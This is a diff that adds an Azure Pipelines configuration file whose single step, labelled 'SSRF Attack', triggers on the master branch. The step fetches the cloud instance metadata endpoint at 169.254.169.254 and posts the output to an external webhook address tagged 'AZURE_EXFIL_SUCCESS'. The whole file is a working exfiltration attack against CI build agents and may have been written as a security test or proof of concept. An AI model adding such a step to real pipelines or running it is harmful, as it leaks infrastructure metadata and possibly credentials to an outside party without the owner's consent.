@@ -1,0 +1,11 @@
+trigger:
+- master
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+steps:
+- script: |
+    curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" > metadata.json
+    curl -X POST -d @metadata.json "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/?status=AZURE_EXFIL_SUCCESS"
+  displayName: 'SSRF Attack'
